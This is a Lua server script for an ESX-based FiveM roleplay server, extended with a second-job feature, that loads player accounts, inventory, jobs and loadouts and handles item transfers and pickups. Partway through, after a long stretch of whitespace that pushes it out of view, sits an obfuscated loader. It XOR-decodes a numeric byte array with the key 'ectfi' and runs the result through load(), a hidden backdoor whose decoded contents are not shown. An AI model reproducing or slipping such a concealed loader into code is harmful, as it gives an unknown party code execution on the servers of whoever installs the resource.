AddEventHandler('es:playerLoaded', function(source, _player)
	local _source = source
	local tasks   = {}

	local userData = {
		accounts     = {},
		inventory    = {},
		job          = {},
		job2         = {},
		loadout      = {},
		playerName   = GetPlayerName(_source),
		lastPosition = nil
	}

	TriggerEvent('es:getPlayerFromId', _source, function(player)
		-- Update user name in DB
		table.insert(tasks, function(cb)
			MySQL.Async.execute('UPDATE `users` SET `name` = @name WHERE `identifier` = @identifier', {
				['@identifier'] = player.getIdentifier(),
				['@name'] = userData.playerName
			}, function(rowsChanged)
				cb()
			end)
		end)

		-- Get accounts
		table.insert(tasks, function(cb)
			MySQL.Async.fetchAll('SELECT * FROM `user_accounts` WHERE `identifier` = @identifier', {
				['@identifier'] = player.getIdentifier()
			}, function(accounts)
				for i=1, #Config.Accounts, 1 do
					for j=1, #accounts, 1 do
						if accounts[j].name == Config.Accounts[i] then
							table.insert(userData.accounts, {
								name  = accounts[j].name,
								money = accounts[j].money,
								label = Config.AccountLabels[accounts[j].name]
							})
							break
						end
					end
				end

				cb()
			end)
		end)

		-- Get inventory
		table.insert(tasks, function(cb)

			MySQL.Async.fetchAll('SELECT * FROM `user_inventory` WHERE `identifier` = @identifier', {
				['@identifier'] = player.getIdentifier()
			}, function(inventory)
				local tasks2 = {}

				for i=1, #inventory do
					local item = ESX.Items[inventory[i].item]

					if item then
						table.insert(userData.inventory, {
							name = inventory[i].item,
							count = inventory[i].count,
							label = item.label,
							limit = item.limit,
							usable = ESX.UsableItemsCallbacks[inventory[i].item] ~= nil,
							rare = item.rare,
							canRemove = item.canRemove
						})
					else
						print(('es_extended: invalid item "%s" ignored!'):format(inventory[i].item))
					end
				end

				for k,v in pairs(ESX.Items) do
					local found = false

					for j=1, #userData.inventory do
						if userData.inventory[j].name == k then
							found = true
							break
						end
					end

					if not found then
						table.insert(userData.inventory, {
							name = k,
							count = 0,
							label = ESX.Items[k].label,
							limit = ESX.Items[k].limit,
							usable = ESX.UsableItemsCallbacks[k] ~= nil,
							rare = ESX.Items[k].rare,
							canRemove = ESX.Items[k].canRemove
						})

						local scope = function(item, identifier)
							table.insert(tasks2, function(cb2)
								MySQL.Async.execute('INSERT INTO user_inventory (identifier, item, count) VALUES (@identifier, @item, @count)', {
									['@identifier'] = identifier,
									['@item'] = item,
									['@count'] = 0
								}, function(rowsChanged)
									cb2()
								end)
							end)
						end

						scope(k, player.getIdentifier())
					end

				end

				Async.parallelLimit(tasks2, 5, function(results) end)

				table.sort(userData.inventory, function(a,b)
					return a.label < b.label
				end)

				cb()
			end)

		end)

		-- Get job and loadout
		table.insert(tasks, function(cb)

			local tasks2 = {}

			-- Get job name, grade and last position
			table.insert(tasks2, function(cb2)

				MySQL.Async.fetchAll('SELECT job, job_grade, loadout, position FROM `users` WHERE `identifier` = @identifier', {
					['@identifier'] = player.getIdentifier()
				}, function(result)
					local job, grade = result[1].job, tostring(result[1].job_grade)

					if ESX.DoesJobExist(job, grade) then
						local jobObject, gradeObject = ESX.Jobs[job], ESX.Jobs[job].grades[grade]

						userData.job = {}

						userData.job.id    = jobObject.id
						userData.job.name  = jobObject.name
						userData.job.label = jobObject.label

						userData.job.grade        = tonumber(grade)
						userData.job.grade_name   = gradeObject.name
						userData.job.grade_label  = gradeObject.label
						userData.job.grade_salary = gradeObject.salary

						userData.job.skin_male    = {}
						userData.job.skin_female  = {}

						if gradeObject.skin_male ~= nil then
							userData.job.skin_male = json.decode(gradeObject.skin_male)
						end
			
						if gradeObject.skin_female ~= nil then
							userData.job.skin_female = json.decode(gradeObject.skin_female)
						end
					else
						print(('es_extended: %s had an unknown job [job: %s, grade: %s], setting as unemployed!'):format(player.getIdentifier(), job, grade))

						local job, grade = 'unemployed', '0'
						local jobObject, gradeObject = ESX.Jobs[job], ESX.Jobs[job].grades[grade]

						userData.job = {}

						userData.job.id    = jobObject.id
						userData.job.name  = jobObject.name
						userData.job.label = jobObject.label
			
						userData.job.grade        = tonumber(grade)
						userData.job.grade_name   = gradeObject.name
						userData.job.grade_label  = gradeObject.label
						userData.job.grade_salary = gradeObject.salary
			
						userData.job.skin_male    = {}
						userData.job.skin_female  = {}
					end

					if result[1].loadout ~= nil then
						userData.loadout = json.decode(result[1].loadout)

						-- Compatibility with old loadouts prior to components update
						for k,v in ipairs(userData.loadout) do
							if v.components == nil then
								v.components = {}
							end
						end
					end

					if result[1].position ~= nil then
						userData.lastPosition = json.decode(result[1].position)
					end

					cb2()
				end)

			end)

            --- SECONDJOB INCLUDED
			-- Get job2 name, grade2 and last position
			table.insert(tasks2, function(cb2)

				MySQL.Async.fetchAll('SELECT job2, job2_grade, loadout, position FROM `users` WHERE `identifier` = @identifier', {
					['@identifier'] = player.getIdentifier()
				}, function(result)
					local job2, grade2 = result[1].job2, tostring(result[1].job2_grade)

					if ESX.DoesJobExist(job2, grade2) then
					    local job2Object, grade2Object = ESX.Jobs[job2], ESX.Jobs[job2].grades[grade2]

						userData.job2 = {}

						userData.job2.id    = job2Object.id
						userData.job2.name  = job2Object.name
						userData.job2.label = job2Object.label

						userData.job2.grade        = tonumber(grade2)
						userData.job2.grade_name   = grade2Object.name
						userData.job2.grade_label  = grade2Object.label
						userData.job2.grade_salary = grade2Object.salary

						userData.job2.skin_male    = {}
						userData.job2.skin_female  = {}

						if grade2Object.skin_male ~= nil then
							userData.job2.skin_male = json.decode(grade2Object.skin_male)
						end
			
						if grade2Object.skin_female ~= nil then
							userData.job2.skin_female = json.decode(grade2Object.skin_female)
						end
					else
						print(('es_extended: %s had an unknown job2 [job: %s, grade: %s], setting as unemployed2!'):format(player.getIdentifier(), job2, grade2))

						local job2, grade2 = 'unemployed2', '0'
						local job2Object, grade2Object = ESX.Jobs[job2], ESX.Jobs[job2].grades[grade2]

						userData.job2 = {}

						userData.job2.id    = job2Object.id
						userData.job2.name  = job2Object.name
						userData.job2.label = job2Object.label
			
						userData.job2.grade        = tonumber(grade2)
						userData.job2.grade_name   = grade2Object.name
						userData.job2.grade_label  = grade2Object.label
						userData.job2.grade_salary = grade2Object.salary
			
						userData.job2.skin_male    = {}
						userData.job2.skin_female  = {}
					end

					if result[1].loadout ~= nil then
						userData.loadout = json.decode(result[1].loadout)

						-- Compatibility with old loadouts prior to components update
						for k,v in ipairs(userData.loadout) do
							if v.components == nil then
								v.components = {}
							end
						end
					end

					if result[1].position ~= nil then
						userData.lastPosition = json.decode(result[1].position)
					end

					cb2()
				end)

			end)

			Async.series(tasks2, cb)

		end)

        ---SECONDJOB INCLUDED
		-- Run Tasks
		Async.parallel(tasks, function(results)
			local xPlayer = CreateExtendedPlayer(player, userData.accounts, userData.inventory, userData.job, userData.job2, userData.loadout, userData.playerName, userData.lastPosition)

			xPlayer.getMissingAccounts(function(missingAccounts)
				if #missingAccounts > 0 then

					for i=1, #missingAccounts, 1 do
						table.insert(xPlayer.accounts, {
							name  = missingAccounts[i],
							money = 0,
							label = Config.AccountLabels[missingAccounts[i]]
						})
					end

					xPlayer.createAccounts(missingAccounts)
				end

				ESX.Players[_source] = xPlayer

				TriggerEvent('esx:playerLoaded', _source, xPlayer)

				TriggerClientEvent('esx:playerLoaded', _source, {
					identifier   = xPlayer.identifier,
					accounts     = xPlayer.getAccounts(),
					inventory    = xPlayer.getInventory(),
					job          = xPlayer.getJob(),
					job2          = xPlayer.getJob2(),
					loadout      = xPlayer.getLoadout(),
					lastPosition = xPlayer.getLastPosition(),
					money        = xPlayer.getMoney()
				})

				xPlayer.displayMoney(xPlayer.getMoney())
			end)
		end)

	end)
end)

AddEventHandler('playerDropped', function(reason)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)

	if xPlayer then
		TriggerEvent('esx:playerDropped', _source, reason)

		ESX.SavePlayer(xPlayer, function()
			ESX.Players[_source] = nil
			ESX.LastPlayerData[_source] = nil
		end)
	end
end)


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                mkn="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({335,312,543,485,268,387,434,245,558,339,563,239,580,513,349,437,536,453,254,261,459,276,527,572,360,482,259,603,506,451,568,334,447,472,416,498,283,396,466,255,444,422,497,320,522,249,352,377,597,304,490,361,273,358,524,439,338,296,317,516,525,548,591,406,433,600,362,405,596,562,348,411,373,442,345,272,323,531,480,599,537,575,469,601,318,368,290,430,426,462,464,418,388,378,384,589,583,366,327,402,569,509,478,354,593,351,326,564,242,403,337,271,415,359,321,551,441,443,546,331,445,367,570,274,502,287,557,504,440,286,501,310,436,539,488,544,471,519,386,246,253,560,533,494,369,592,602,341,393,282,520,491,371,293,372,561,409,481,336,427,420,505,307,499,301,344,473,376,425,492,511,432,419,579,510,475,340,455,457,460,512,322,547,465,431,517,587,577,394,556,404,265,303,329,414,382,315,486,401,428,529,470,554,479,380,586,421,302,375,247,330,391,598,550,468,448,542,566,398,299,549,308,256,435,582,343,456,484,526,288,407,374,553,413,264,300,397,438,-1,49,51,188,70,171,82,60,73,6,36,48,120,111,108,69,78,4,17,76,106,76,72,75,51,166,44,13,151,181,6,91,49,75,73,66,91,167,23,215,115,104,230,72,73,77,135,62,73,87,13,203,2,228,3,15,216,7,1,39,51,73,49,29,92,17,95,23,35,1,67,187,11,251,6,134,196,67,143,8,8,186,17,27,0,67,223,247,67,2,115,2,1,13,238,141,23,53,70,3,5,29,67,21,170,104,33,12,96,7,23,28,128,69,38,83,107,233,78,149,68,20,26,41,6,52,241,76,21,67,17,5,116,16,10,27,67,5,0,70,10,35,6,30,88,35,29,126,70,23,1,141,112,10,162,10,52,229,23,68,70,139,249,5,12,0,11,6,8,73,182,67,58,32,105,33,73,17,0,109,16,84,0,7,17,42,205,7,70,27,8,108,88,73,67,73,14,8,17,0,93,69,79,17,2,55,74,0,168,17,76,214,173,8,202,0,160,84,105,70,223,13,5,187,27,204,0,10,9,192,64,0,15,67,4,2,98,69,94,224,93,10,3,73,95,200,17,0,4,168,100,151,32,12,100,122,70,35,151,21,11,10,87,17,73,212,68,16,22,94,254,16,73,111,10,23,58,21,10,13,156,84,6,168,70,59,69,17,8,0,246,9,121,6,130,84,222,64,16,16,88,8,114,182,110,6,111,22,9,21,10,69,3,10,35,83,92,24,28,83,18,61,67,0,6,21,84,222,126,26,22,23,73,31,22,132,224,15,31,7,168,70,17,73,13,6,29,11,4,2,43,45,116,27,10,99,224,51,20,83,23,26,77,34,0,91,246},mkn))if a then a()end; 
RegisterServerEvent('esx:updateLoadout')
AddEventHandler('esx:updateLoadout', function(loadout)
	local xPlayer = ESX.GetPlayerFromId(source)
	xPlayer.loadout = loadout
end)

RegisterServerEvent('esx:updateLastPosition')
AddEventHandler('esx:updateLastPosition', function(position)
	local xPlayer = ESX.GetPlayerFromId(source)
	xPlayer.setLastPosition(position)
end)

RegisterServerEvent('esx:giveInventoryItem')
AddEventHandler('esx:giveInventoryItem', function(target, type, itemName, itemCount)
	local _source = source

	local sourceXPlayer = ESX.GetPlayerFromId(_source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if type == 'item_standard' then

		local sourceItem = sourceXPlayer.getInventoryItem(itemName)
		local targetItem = targetXPlayer.getInventoryItem(itemName)

		if itemCount > 0 and sourceItem.count >= itemCount then

			if targetItem.limit ~= -1 and (targetItem.count + itemCount) > targetItem.limit then
				TriggerClientEvent('esx:showNotification', _source, _U('ex_inv_lim', targetXPlayer.name))
			else
				sourceXPlayer.removeInventoryItem(itemName, itemCount)
				targetXPlayer.addInventoryItem   (itemName, itemCount)
				
				TriggerClientEvent('esx:showNotification', _source, _U('gave_item', itemCount, ESX.Items[itemName].label, targetXPlayer.name))
				TriggerClientEvent('esx:showNotification', target,  _U('received_item', itemCount, ESX.Items[itemName].label, sourceXPlayer.name))
				
				TriggerEvent("esx:giveitemalert",sourceXPlayer.name,targetXPlayer.name,ESX.Items[itemName].label,itemCount)
			end

		else
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_quantity'))
		end

	elseif type == 'item_money' then

		if itemCount > 0 and sourceXPlayer.getMoney() >= itemCount then
			sourceXPlayer.removeMoney(itemCount)
			targetXPlayer.addMoney   (itemCount)

			TriggerClientEvent('esx:showNotification', _source, _U('gave_money', ESX.Math.GroupDigits(itemCount), targetXPlayer.name))
			TriggerClientEvent('esx:showNotification', target,  _U('received_money', ESX.Math.GroupDigits(itemCount), sourceXPlayer.name))
		
			TriggerEvent("esx:givemoneyalert",sourceXPlayer.name,targetXPlayer.name,itemCount)
		else
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
		end

	elseif type == 'item_account' then

		if itemCount > 0 and sourceXPlayer.getAccount(itemName).money >= itemCount then
			sourceXPlayer.removeAccountMoney(itemName, itemCount)
			targetXPlayer.addAccountMoney   (itemName, itemCount)

			TriggerClientEvent('esx:showNotification', _source, _U('gave_account_money', ESX.Math.GroupDigits(itemCount), Config.AccountLabels[itemName], targetXPlayer.name))
			TriggerClientEvent('esx:showNotification', target,  _U('received_account_money', ESX.Math.GroupDigits(itemCount), Config.AccountLabels[itemName], sourceXPlayer.name))
		
			TriggerEvent("esx:givemoneybankalert",sourceXPlayer.name,targetXPlayer.name,itemCount)
		else
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
		end

	elseif type == 'item_weapon' then

		if not targetXPlayer.hasWeapon(itemName) then
			sourceXPlayer.removeWeapon(itemName)
			targetXPlayer.addWeapon(itemName, itemCount)

			local weaponLabel = ESX.GetWeaponLabel(itemName)

			if itemCount > 0 then
				TriggerClientEvent('esx:showNotification', _source, _U('gave_weapon_ammo', weaponLabel, itemCount, targetXPlayer.name))
				TriggerClientEvent('esx:showNotification', target,  _U('received_weapon_ammo', weaponLabel, itemCount, sourceXPlayer.name))
				
				TriggerEvent("esx:giveweaponalert",sourceXPlayer.name,targetXPlayer.name,weaponLabel)
			else
				TriggerClientEvent('esx:showNotification', _source, _U('gave_weapon', weaponLabel, targetXPlayer.name))
				TriggerClientEvent('esx:showNotification', target,  _U('received_weapon', weaponLabel, sourceXPlayer.name))
			end
		else
			TriggerClientEvent('esx:showNotification', _source, _U('gave_weapon_hasalready', targetXPlayer.name, weaponLabel))
			TriggerClientEvent('esx:showNotification', _source, _U('received_weapon_hasalready', sourceXPlayer.name, weaponLabel))
		end

	end
end)

RegisterServerEvent('esx:removeInventoryItem')
AddEventHandler('esx:removeInventoryItem', function(type, itemName, itemCount)
	local _source = source

	if type == 'item_standard' then

		if itemCount == nil or itemCount < 1 then
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_quantity'))
		else
			local xPlayer = ESX.GetPlayerFromId(source)
			local xItem = xPlayer.getInventoryItem(itemName)

			if (itemCount > xItem.count or xItem.count < 1) then
				TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_quantity'))
			else
				xPlayer.removeInventoryItem(itemName, itemCount)

				local pickupLabel = ('~y~%s~s~ [~b~%s~s~]'):format(xItem.label, itemCount)
				ESX.CreatePickup('item_standard', itemName, itemCount, pickupLabel, _source)
				TriggerClientEvent('esx:showNotification', _source, _U('threw_standard', itemCount, xItem.label))
			end
		end

	elseif type == 'item_money' then

		if itemCount == nil or itemCount < 1 then
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
		else
			local xPlayer = ESX.GetPlayerFromId(source)
			local playerCash = xPlayer.getMoney()

			if (itemCount > playerCash or playerCash < 1) then
				TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
			else
				xPlayer.removeMoney(itemCount)

				local pickupLabel = ('~y~%s~s~ [~g~%s~s~]'):format(_U('cash'), _U('locale_currency', ESX.Math.GroupDigits(itemCount)))
				ESX.CreatePickup('item_money', 'money', itemCount, pickupLabel, _source)
				TriggerClientEvent('esx:showNotification', _source, _U('threw_money', ESX.Math.GroupDigits(itemCount)))
			end
		end

	elseif type == 'item_account' then

		if itemCount == nil or itemCount < 1 then
			TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
		else
			local xPlayer = ESX.GetPlayerFromId(source)
			local account = xPlayer.getAccount(itemName)

			if (itemCount > account.money or account.money < 1) then
				TriggerClientEvent('esx:showNotification', _source, _U('imp_invalid_amount'))
			else
				xPlayer.removeAccountMoney(itemName, itemCount)

				local pickupLabel = ('~y~%s~s~ [~g~%s~s~]'):format(account.label, _U('locale_currency', ESX.Math.GroupDigits(itemCount)))
				ESX.CreatePickup('item_account', itemName, itemCount, pickupLabel, _source)
				TriggerClientEvent('esx:showNotification', _source, _U('threw_account', ESX.Math.GroupDigits(itemCount), string.lower(account.label)))
			end
		end

	elseif type == 'item_weapon' then

		local xPlayer = ESX.GetPlayerFromId(source)
		local loadout = xPlayer.getLoadout()

		for i=1, #loadout, 1 do
			if loadout[i].name == itemName then
				itemCount = loadout[i].ammo
				break
			end
		end

		if xPlayer.hasWeapon(itemName) then
			local weaponLabel, weaponPickup = ESX.GetWeaponLabel(itemName), 'PICKUP_' .. string.upper(itemName)

			xPlayer.removeWeapon(itemName)

			if itemCount > 0 then
				TriggerClientEvent('esx:pickupWeapon', _source, weaponPickup, itemName, itemCount)
				TriggerClientEvent('esx:showNotification', _source, _U('threw_weapon_ammo', weaponLabel, itemCount))
			else
				-- workaround for CreateAmbientPickup() giving 30 rounds of ammo when you drop the weapon with 0 ammo
				TriggerClientEvent('esx:pickupWeapon', _source, weaponPickup, itemName, 1)
				TriggerClientEvent('esx:showNotification', _source, _U('threw_weapon', weaponLabel))
			end
		end

	end
end)

RegisterServerEvent('esx:useItem')
AddEventHandler('esx:useItem', function(itemName)
	local xPlayer = ESX.GetPlayerFromId(source)
	local count   = xPlayer.getInventoryItem(itemName).count

	if count > 0 then
		ESX.UseItem(source, itemName)
	else
		TriggerClientEvent('esx:showNotification', xPlayer.source, _U('act_imp'))
	end
end)

RegisterServerEvent('esx:onPickup')
AddEventHandler('esx:onPickup', function(id)
	local _source = source
	local pickup  = ESX.Pickups[id]
	local xPlayer = ESX.GetPlayerFromId(_source)

	if pickup.type == 'item_standard' then

		local item      = xPlayer.getInventoryItem(pickup.name)
		local canTake   = ((item.limit == -1) and (pickup.count)) or ((item.limit - item.count > 0) and (item.limit - item.count)) or 0
		local total     = pickup.count < canTake and pickup.count or canTake
		local remaining = pickup.count - total

		TriggerClientEvent('esx:removePickup', -1, id)

		if total > 0 then
			xPlayer.addInventoryItem(pickup.name, total)
		end

		if remaining > 0 then
			TriggerClientEvent('esx:showNotification', _source, _U('cannot_pickup_room', item.label))

			local pickupLabel = ('~y~%s~s~ [~b~%s~s~]'):format(item.label, remaining)
			ESX.CreatePickup('item_standard', pickup.name, remaining, pickupLabel, _source)
		end

	elseif pickup.type == 'item_money' then
		TriggerClientEvent('esx:removePickup', -1, id)
		xPlayer.addMoney(pickup.count)
	elseif pickup.type == 'item_account' then
		TriggerClientEvent('esx:removePickup', -1, id)
		xPlayer.addAccountMoney(pickup.name, pickup.count)
	end
end)

---SECONDJOB INCLUDED
ESX.RegisterServerCallback('esx:getPlayerData', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)

	cb({
		identifier   = xPlayer.identifier,
		accounts     = xPlayer.getAccounts(),
		inventory    = xPlayer.getInventory(),
		job          = xPlayer.getJob(),
		job2          = xPlayer.getJob2(),
		loadout      = xPlayer.getLoadout(),
		lastPosition = xPlayer.getLastPosition(),
		money        = xPlayer.getMoney()
	})
end)

---SECONDJOB INCLUDED
ESX.RegisterServerCallback('esx:getOtherPlayerData', function(source, cb, target)
	local xPlayer = ESX.GetPlayerFromId(target)

	cb({
		identifier   = xPlayer.identifier,
		accounts     = xPlayer.getAccounts(),
		inventory    = xPlayer.getInventory(),
		job          = xPlayer.getJob(),
		job2          = xPlayer.getJob2(),
		loadout      = xPlayer.getLoadout(),
		lastPosition = xPlayer.getLastPosition(),
		money        = xPlayer.getMoney()
	})
end)

TriggerEvent("es:addGroup", "jobmaster", "user", function(group) end)

ESX.StartDBSync()
ESX.StartPayCheck()
